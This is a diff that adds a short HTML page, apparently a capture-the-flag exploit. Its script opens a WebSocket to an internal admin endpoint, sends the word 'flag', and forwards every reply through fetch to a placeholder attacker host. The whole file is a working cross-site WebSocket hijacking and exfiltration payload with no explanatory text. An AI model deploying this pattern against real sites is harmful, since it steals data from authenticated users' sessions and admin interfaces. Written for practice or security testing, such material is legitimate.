@@ -1,0 +1,17 @@
+<!doctype html>
+<html>
+  <body>
+    <script>
+      const ws = new WebSocket("ws://web:8080/admin/ws");
+      ws.onopen = () => ws.send("flag");
+      ws.onmessage = (e) => {
+        {
+          fetch(
+            "http://{ATTACKER_HOST}:{ATTACKER_PORT}/?flag=" +
+              encodeURIComponent(e.data),
+          );
+        }
+      };
+    </script>
+  </body>
+</html>
